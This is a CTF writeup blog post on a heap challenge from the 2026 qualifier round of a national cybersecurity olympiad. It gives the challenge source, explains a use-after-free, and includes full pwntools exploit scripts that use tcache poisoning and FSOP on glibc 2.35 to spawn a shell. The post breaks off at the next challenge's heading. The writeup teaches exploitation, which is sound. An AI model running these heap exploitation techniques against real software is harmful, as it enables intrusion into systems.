---
id: 5
title: "National Cybersecurity Olympiad 2026"
subtitle: "Writeups for the pwn challenges that I solved (which is all of them eventually)"
date: "2026.04.12"
tags: "writeups"
---

Around two weeks ago, I participated in the National Cybersecurity Olympiad (NCO) 2026 qualifications and finals, where for the first time I not only had to do pwn, but also actually manage other categories (horror!).

It was very fun, also considering that I'd managed to solve all the qualification pwn challenges during the timeframe, as well as 2/3 of the finals pwn during the contest.

These are the various writeups for the challenges that I had solved (as well as the one challenge I could not during the contest).

# Quals

i will write these in the order that i solved them

## pwn/delta

### Challenge Protections

{{<component name="terminal">}}
Arch:       amd64-64-little
RELRO:      {{<component name="color" color="yellow">}}Partial RELRO {{</component>}}
Stack:      {{<component name="color" color="red">}}No canary found{{</component>}}
NX:         {{<component name="color" color="green">}}NX enabled{{</component>}}
PIE:        {{<component name="color" color="red">}}No PIE (0x3fe000){{</component>}}
RUNPATH:    {{<component name="color" color="red">}}b'.'{{</component>}}
Stripped:   {{<component name="color" color="red">}}No{{</component>}}
{{</component>}}

### Source

```c
#include <malloc.h>

#define MAX 0x7

void *allocs[MAX];

int get_num() {
  char buf[0x20];
  fgets(buf, 0x20, stdin);
  return atoi(buf);
}

int get_idx() {
  int idx = get_num();
  if (idx < 0 || idx >= MAX) {
    puts("invalid idx");
    return -1;
  }
  return idx;
}

void create() {
  int idx = 0;
  int size = 0;

  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }
  
  printf("size > ");
  size = get_num();
  if (size < 0 || size > 0x1000) {
    puts("invalid size");
    return;
  }

  allocs[idx] = malloc(size);

  printf("input > ");
  fgets(allocs[idx], size, stdin);
}

void delete() {
  int idx = 0;

  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }

  if (allocs[idx] == NULL) {
    puts("invalid idx");
    return;
  }

  free(allocs[idx]);
}

void edit() {
  int idx = 0;
  int delta = 0;

  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }

  if (allocs[idx] == NULL) {
    puts("invalid idx");
    return;
  }

  printf("delta > ");
  delta = get_num();
  if (delta < -0x1000 || delta > 0x1000) {
    puts("invalid change");
    return;
  }

  *(size_t *)allocs[idx] += delta;
}

void read() {
  int idx = 0;
  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }

  if (allocs[idx] == NULL) {
    puts("invalid idx");
    return;
  }

  printf("content: ");
  puts(allocs[idx]);
}

void menu() {
  puts("1. create");
  puts("2. delete");
  puts("3. edit");
  puts("4. read");
  printf("> ");
}

void setup() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
}

int main() {
  setup();
  char buf[0x20];
  int choice = 0;

  while (1) {
    menu();
    fgets(buf, 0x20, stdin);
    choice = atoi(buf);
    switch (choice) {
      case 1:
        create();
        break;
      case 2:
        delete();
        break;
      case 3:
        edit();
        break;
      case 4:
        read();
        break;
      default:
        puts("invalid choice");
    }
  }
}
``` 

### Challenge Analysis

The vulnerability is in the `delete()` function, where the array entry in `allocs` is not nulled out after free. This gives us a Use-After-Free (UAF).

```c
void delete() {
  int idx = 0;

  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }

  if (allocs[idx] == NULL) {
    puts("invalid idx");
    return;
  }

  free(allocs[idx]);
  // no null!
  // allocs[idx] = NULL;
}
```

### Solve

Since we have a UAF, our first instincts would be to leak the heap base (through a mangled `fd` in a tcache entry) as well as libc (through `main_arena` in an unsorted chunk).

```python
#!/usr/bin/python3
from pwn import *
from sys import argv

elf = context.binary = ELF('chal')
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.35.so', checksec=False)
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: elf.process()

context.log_level = 'debug'
context.terminal = 'kitty'

p = remote('chal.nco.sg', 10033)

option = lambda i: p.sendlineafter(b'> ', str(i).encode())
sendi = lambda i: p.sendlineafter(b'> ', str(i).encode())
sendb = lambda b: p.sendlineafter(b'> ', b)

def malloc(idx, size, content):
    option(1)
    sendi(idx)
    sendi(size)
    sendb(content)

def free(idx):
    option(2)
    sendi(idx)

def add(idx, offset):
    option(3) 
    sendi(idx)
    sendi(offset)

def view(idx):
    option(4)
    sendi(idx)
    p.recvuntil(b'content: ')
    return p.recvline().strip(b'\n')

malloc(0, 0x500, b'a')
malloc(1, 0x100, b'a')
malloc(2, 0x100, b'a')
malloc(3, 0x100, b'a')
free(0)

libc.address = u64(view(0).ljust(8, b'\0')) - libc.sym.main_arena - 96
log.info("libc.address, %#x", libc.address)

free(1)
mangle = u64(view(1).ljust(8, b'\0'))
heap = mangle << 12
log.info("mangle, %#x", mangle)
```

Now, we are in position to create a tcache poisoning attack, that would give us an arbitrary allocation. However, there is a caveat!

#### The edit() function

```c
void edit() {
  int idx = 0;
  int delta = 0;

  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }

  if (allocs[idx] == NULL) {
    puts("invalid idx");
    return;
  }

  printf("delta > ");
  delta = get_num();
  if (delta < -0x1000 || delta > 0x1000) {
    puts("invalid change");
    return;
  }

  *(size_t *)allocs[idx] += delta;
}
```

Instead of giving us a straightforward read from stdin into the chunk, we are instead only given the addition of a small offset (within 0x1000) onto the 64-bit number in the first qword of the chunk.

Note that before we do tcache poisoning, the fd pointers usually point within the heap itself. This is a problem because the offset between a heap address and a libc address is much greater than the limit given.

For example, considering that the address of the stdout `FILE` struct is 0x7ffff7e1b780,

{{<component name="tcache-fd">}}{{</component>}}

It can be seen that the offset from the initial fd to our target fd is far greater than the limit.

#### The `tcache_perthread_struct`

The `tcache_perthread_struct` is a struct that keeps tracks of the tcachebin metadata, such as the counts and the bin heads.

```c
typedef struct tcache_perthread_struct {
	unsigned short counts[64];
	tcache_entry *entries[64];
} tcache_perthread_struct;
```

When a tcache entry is brought to the head of the tcachebin, glibc malloc will do the following:
    - Unmangle the fd of the previous head,
    - Set the head of the corresponding `tcache_perthread_struct->entries[idx]` to the unmangled fd

As the tcache perthread struct keeps unmangled values in the struct, it is a prominent attack surface in heap exploitation considering it is already in the heap.

Among many things, this also means that it is a suitable target for us to arballoc to with our tcache poisoning primitive, since the offset is within the limit (considering it's also in the heap).

We perform the solve as such:

1. fill the tcachebin with three chunks
2. tcache poison the head chunk and point its fd to the corresponding `tcache_perthread_struct` entry
3. allocate two chunks - the second chunk is allocated onto the `tcache_perthread_struct` entry.
4. Since there is one chunk remaining in the tcachebin, it is brought to the head. Using our chunk allocated onto the perthread struct entry, we can overwrite the head to the stdout `FILE` struct.
5. Now, allocate onto the stdout `FILE` struct and get a shell via FSOP.

```python
#!/usr/bin/python3
from pwn import *
from sys import argv

elf = context.binary = ELF('chal')
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.35.so', checksec=False)
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: elf.process()

context.log_level = 'debug'
context.terminal = 'kitty'

p = remote('chal.nco.sg', 10033)

option = lambda i: p.sendlineafter(b'> ', str(i).encode())
sendi = lambda i: p.sendlineafter(b'> ', str(i).encode())
sendb = lambda b: p.sendlineafter(b'> ', b)

def malloc(idx, size, content):
    option(1)
    sendi(idx)
    sendi(size)
    sendb(content)

def free(idx):
    option(2)
    sendi(idx)

def add(idx, offset):
    option(3) 
    sendi(idx)
    sendi(offset)

def view(idx):
    option(4)
    sendi(idx)
    p.recvuntil(b'content: ')
    return p.recvline().strip(b'\n')

malloc(0, 0x500, b'a')
malloc(1, 0x100, b'a')
malloc(2, 0x100, b'a')
malloc(3, 0x100, b'a')
free(0)

libc.address = u64(view(0).ljust(8, b'\0')) - libc.sym.main_arena - 96
log.info("libc.address, %#x", libc.address)

free(1)
mangle = u64(view(1).ljust(8, b'\0'))
heap = mangle << 12
log.info("mangle, %#x", mangle)
free(3)
free(2)

initial = u64(view(2).ljust(8, b'\0'))
target = mangle ^ (heap+0x100)

offset = target - initial

add(2, offset)
malloc(0, 0x100, b'a')
malloc(0, 0x100, p64(0)+p64(libc.sym._IO_2_1_stdout_))

stdout_lock = libc.address + 0x21ca70	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x0000000000163710# add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']		# the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200		# _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

malloc(0, 0x100, bytes(fake))

p.interactive()
```

## pwn/goatvr
